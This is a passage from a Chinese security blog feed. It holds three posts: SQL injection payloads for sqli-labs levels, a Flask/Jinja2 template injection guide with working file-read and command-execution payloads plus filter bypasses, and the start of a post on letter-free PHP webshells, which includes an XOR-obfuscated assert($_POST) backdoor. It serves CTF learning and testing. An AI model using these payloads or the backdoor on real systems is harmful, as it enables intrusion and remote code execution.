id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>和<strong>less-9</strong>一样，单引号改成双引号</p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>报错注入，只显示部分字符使用<strong>trim</strong>截取掉已经出现的部分</p><figure class="highlight plain"><figcaption><span>from b)```，将字符串 B 中的 A 部分删去，返回剩余部分</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">查数据库：</span><br><span class="line">admin&#39;||updatexml(1,concat(0x7e,trim(&quot;ctftraining,information_schema,&quot; from (select group_concat(schema_name) from information_schema.schemata)),0x7e),1)%23</span><br><span class="line">查数据：</span><br><span class="line">admin&#39;||updatexml(1,concat(0x7e,trim(&#39;flag&#123;a51ea1de-a683-4fb1-a9aa-95&#39; from (select group_concat(flag) from ctftraining.flag)),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xpsz&quot;) and (select 6059 from(select count(*),concat(0x7e,(select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) </span><br><span class="line">from information_schema.schemata limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.plugins group by x)a) and (&quot;ygyp&quot;&#x3D;&quot;ygyp</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>把<strong>less-12</strong>双引号改成单引号</p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>把<strong>less-12</strong>中的括号去掉</p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; and (select 1 from (select(sleep(3-if(ord(mid((select flag from ctftraining.flag),1,1))&gt;102,0,3))))a) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) and (select(sleep(3-if((ord(mid((select flag from ctftraining.flag),1,1)))&gt;100,0,3)))) and (&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>从查询语句变成插入语句，好像还是一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and updatexml(1,concat(0x7e,(select flag from ctftraining.flag),0x7e),1) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>user-agent头报错注入。</p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>referer注入</p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>cookie注入</p><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;br&gt;早就想刷sqli_labs了，这几天正好没事干，学习一下sql注入，顺便熟悉一下sqlmap&lt;br&gt;练习平台：&lt;a href=&quot;https://buuoj.cn/challenges#sqli-labs&quot;&gt;https://buuoj.cn/challenges#sqli-labs&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="sql注入" scheme="http://yoursite.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>一些笔记</title>
    <link href="http://yoursite.com/2020/07/31/links/"/>
    <id>http://yoursite.com/2020/07/31/links/</id>
    <published>2020-07-31T05:25:44.103Z</published>
    <updated>2020-08-27T10:27:14.119Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="不好意思，密码没对哦，在检查检查呢！" data-whm="不好意思，信息无法验证！">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">嗨，请准确无误地输入密码查看哟！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="12e1027128429856076e290aa13788d33e4bd199cf6a03ba691b22ee55acc2b2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      咦，这是一篇加密文章，好像需要输入密码才能查看呢！
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Flask ssti模板注入一些总结</title>
    <link href="http://yoursite.com/2020/07/25/ssti-1/"/>
    <id>http://yoursite.com/2020/07/25/ssti-1/</id>
    <published>2020-07-25T06:39:38.000Z</published>
    <updated>2020-09-16T05:11:36.836Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ssti思路"><a href="#ssti思路" class="headerlink" title="ssti思路"></a>ssti思路</h1><p>服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，<a id="more"></a>在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>ssti模板注入的基本思路就是通过<code>__class__</code>属性找到基类object，通过<code>__subclasses__()</code>查看object中有哪些类可以使用，一般都是去寻找os类，然后通过<strong>blobals</strong>全局来查找所有的方法及变量及参数，通常用到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类的<code>popen</code>方法。</p><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><h2 id="首先获取基本类"><a href="#首先获取基本类" class="headerlink" title="首先获取基本类"></a>首先获取基本类</h2><p>首先通过str、dict、tuple或list等获取python的基本类</p><ul><li><strong>dict</strong>：保存类实例或对象实例的属性变量键值对字典</li><li><strong>class</strong>：返回调用的参数类型</li><li><strong>mro</strong>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li><li><strong>bases</strong>：返回类型列表</li><li><strong>subclasses</strong>：返回object的子类</li><li><strong>init</strong>：类的初始化方法</li><li><strong>globals</strong>：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li></ul><p>也可以用一些其他在jinja2中存在的对象，比如<code>request</code>。在Python中，每个类都有一个<strong>bases</strong>属性，列出其基类，而<strong>mro</strong>返回的时解析方法调用的顺序，在其中选择<strong>object</strong>类就好了。</p><ul><li><code>&#39;&#39;.__class__.__base__</code></li><li><code>&#39;&#39;.__class__.__mro__[1]</code></li><li><code>&quot;&quot;.__class__.__bases__[0]</code></li><li><code>().__class__.__bases__[0]</code></li><li><code>[].__class__.__bases__[0]</code></li><li><code>{}.__class__.__mro__[1]</code></li><li><code>request.__class__.__mro__[1]</code></li></ul><p>可以借助```<strong>getitem</strong>绕过中括号的限制：</p><ul><li><code>&#39;&#39;.__class__.__mro__.__getitem__(1)</code></li><li><code>{}.__class__.__bases__.__getitem__(0)</code></li><li><code>().__class__.__bases__.__getitem__(0)</code></li><li><code>request.__class__.__mro__.__getitem__(1)</code></li></ul><h2 id="寻找方法"><a href="#寻找方法" class="headerlink" title="寻找方法"></a>寻找方法</h2><p>获取基本类后，继续向下获取基本类<code>object</code>的子类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure><p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__)</span><br><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[1].__init__)</span><br><span class="line">输出：</span><br><span class="line">&lt;function BlueprintSetupState.__init__ at 0x038CE0C0&gt;</span><br><span class="line">&lt;slot wrapper &#39;__init__&#39; of &#39;weakref&#39; objects&gt;</span><br></pre></td></tr></table></figure><p>查看其引用<strong>builtins</strong><br>Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;]</span><br></pre></td></tr></table></figure><p>这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 open （python2中是file）以实现读取文件的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;D:\\test.txt&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>在python2中使用file读写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#读文件：</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写文件：</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br></pre></td></tr></table></figure><p>在python3中file没有了，使用open：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#读文件：</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;D:\\test.txt&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="1-popen"><a href="#1-popen" class="headerlink" title="1.popen"></a>1.popen</h3><p>使用<code>popen</code>进行命令执行。<br>首先要先找到<code>os._wrap_close</code>类，<br>查看 os._wrap_close 方法的位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[1].__subclasses__().index(os._wrap_close)</span><br><span class="line">132</span><br></pre></td></tr></table></figure><p>返回了下标索引，直接调用它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h3 id="2-eval"><a href="#2-eval" class="headerlink" title="2.eval"></a>2.eval</h3><p>使用<code>eval</code>进行命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</span><br></pre></td></tr></table></figure><h3 id="3-warnings-catch-warnings"><a href="#3-warnings-catch-warnings" class="headerlink" title="3.warnings.catch_warnings"></a>3.warnings.catch_warnings</h3><p>利用warnings.catch_warnings 进行命令执行。<br>这个在python2和python3中有些不同，先说Python2的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</span><br></pre></td></tr></table></figure><p>然后是Python3的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)</span><br></pre></td></tr></table></figure><p>或者也可以这样多行执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="4-subprocess"><a href="#4-subprocess" class="headerlink" title="4.subprocess"></a>4.subprocess</h3><p>这个模块原本在python2中是<code>commands</code>，在python中被替换为<code>subprocess</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).getstatusoutput(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>现在很多模板注入都有限制，比如限制输入某些关键字，或者干脆直接限制输入某些字符。下面总结了一些绕过的方法。</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h2><p>使用getitem()或者pop()绕过，如：<code>&quot;&quot;.__class__.__bases__[0]</code><br>绕过后：<code>&quot;&quot;.__class__.__bases__.getitem(0)</code></p><p>读文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__.__subclasses__().pop(-1).__init__.__globals__.pop(&#39;__builtins__&#39;).pop(&#39;open&#39;)(&#39;test.txt&#39;).read()</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__base__.__subclasses__().pop(132).__init__.__globals__.pop(&#39;popen&#39;)(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>request.args 是 flask 中的一个属性，为返回请求的参数，这里把<code>popen</code>和<code>cmd</code>当作变量名，将值传进来，进而绕过了引号的过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(117).__init__.__globals__[request.args.popen](request.args.cmd).read()&#125;&#125;&amp;popen&#x3D;popen&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><h2 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h2><p>也是动态传参绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[request.args.class][request.args.base][request.args.subclasses]()[117][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read()&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;subclasses&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;popen&#x3D;popen&amp;cmd&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p>比如过滤掉<code>subclasses</code>：</p><h3 id="使用request-args动态传参绕过"><a href="#使用request-args动态传参绕过" class="headerlink" title="使用request.args动态传参绕过"></a>使用<code>request.args</code>动态传参绕过</h3><p>比如过滤掉<code>subclasses</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0][request.args.a]()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)&#125;&#125;&amp;a&#x3D;__subclasses__</span><br><span class="line"># cookie传值</span><br><span class="line">&quot;&quot;.__class__.__bases__[0][request.cookies[&#39;var&#39;]]()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</span><br></pre></td></tr></table></figure><h3 id="使用base64编码绕过"><a href="#使用base64编码绕过" class="headerlink" title="使用base64编码绕过"></a>使用base64编码绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 编码前</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)</span><br><span class="line"># 编码后</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#39;ZXZhbA&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk&#x3D;&quot;.decode(&#39;base64&#39;))</span><br></pre></td></tr></table></figure><h3 id="使用字符串拼接绕过"><a href="#使用字符串拼接绕过" class="headerlink" title="使用字符串拼接绕过"></a>使用字符串拼接绕过</h3><p>使用加号来拼接字符串，<code> = </code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__[&#39;__subcl&#39;+&#39;asses__&#39;]()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>使用join连接字符串，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="过滤点号"><a href="#过滤点号" class="headerlink" title="过滤点号"></a>过滤点号</h2><p>jinja2模板中有很多有用的内置过滤器，这里使用的是<code>attr</code>和<code>join</code>这两个过滤器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;&#96;&#96;&#96;就相当于&#96;&#96;&#96;&#123;&#123;request.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><p>还有关于过滤的方式：</p><blockquote><p><a href="https://github.red/cybrics-2020-web-writeup/">https://github.red/cybrics-2020-web-writeup/</a></p></blockquote><h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><h2 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h2><blockquote><p>服务器端模板注入和代码注入检测与开发工具</p></blockquote><p>一个 python 工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用 SSTI 来访问目标文件或操作系统。一些受支持的模板引擎包括 PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ssti思路&quot;&gt;&lt;a href=&quot;#ssti思路&quot; class=&quot;headerlink&quot; title=&quot;ssti思路&quot;&gt;&lt;/a&gt;ssti思路&lt;/h1&gt;&lt;p&gt;服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="ssti" scheme="http://yoursite.com/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字构造webshell的学习</title>
    <link href="http://yoursite.com/2020/07/23/webshell/"/>
    <id>http://yoursite.com/2020/07/23/webshell/</id>
    <published>2020-07-23T11:37:52.000Z</published>
    <updated>2020-08-02T14:01:54.326Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近碰到一道题，便学习了一下相关无字母数字构造webshell的知识。题目如下：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目中可以看到字母和数字是没法使用的，而且payload长度必须在40以内。我们需要绕过正则过滤，利用不可见字符或者正则表达式遗漏的字符通过各种变换来构造出a-z中的任意一个字符，并且长度小于40，然后再利用php允许动态函数执行的特点，拼接出一个函数名，然后动态执行之即可。<br>那么，我们现在的问题就是如何通过各种变换，是的我们能够成功构造出所需的函数，然后拿到webshell。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="php5和7的差异："><a href="#php5和7的差异：" class="headerlink" title="php5和7的差异："></a>php5和7的差异：</h2><p>php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。</p><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><p>(1)代码中没有引号的字符都自动作为字符串<br>    我猜这也是为什么传马的时候<code>$_GET[&#39;cmd&#39;]</code>和<code>$_GET[cmd]</code>都可以</p><p>(2)Ascii码大于 0x7F 的字符都会被当作字符串</p><p>(3)php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型</p><p>(4)在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理<br>所以有<code>${_GET}{cmd}</code></p><h2 id="不使用数字字母构造数字"><a href="#不使用数字字母构造数字" class="headerlink" title="不使用数字字母构造数字"></a>不使用数字字母构造数字</h2><p>利用了php弱类型的特性，true的值为1，所以true+true==2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);  &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;  &#x2F;&#x2F;$_&#x3D;1</span><br></pre></td></tr></table></figure><p>在php中未定义的变量默认值为null，null==false==0，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++; </span><br><span class="line">&#x2F;&#x2F;$_&#x3D;1</span><br></pre></td></tr></table></figure><p>也可以用!操作符来进行布尔类型的转换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo !$_;</span><br><span class="line">&#x2F;&#x2F;这个代码将输出1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h1><p>构造无字母数字webshell一般用到下面这几种方法：</p><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在php中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，想得到a-z中的某个字母，就找到某两个非字母、数字的字符，他们异或的结果是这个字母即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;A&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：~</span><br></pre></td></tr></table></figure><p>输出的结果是字符”~”，这是因为代码对字符”A”和字符”?”进行了异或操作。在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。<br>例如下面这个php后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;:&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;[&#39;).(&#39;&gt;&#39;^&#39;[&#39;).(&#39;)&#39;^&#39;[&#39;).(&#39;&#x2F;&#39;^&#39;[&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;+&#39;^&#39;&#123;&#39;).(&#39;&#x2F;&#39;^&#39;&#96;&#39;).(&#39;(&#39;^&#39;&#123;&#39;).(&#39;&#x2F;&#39;^&#39;&#123;&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="/images/20200723230637.png" alt=""></p><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>来看一个汉字”和”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 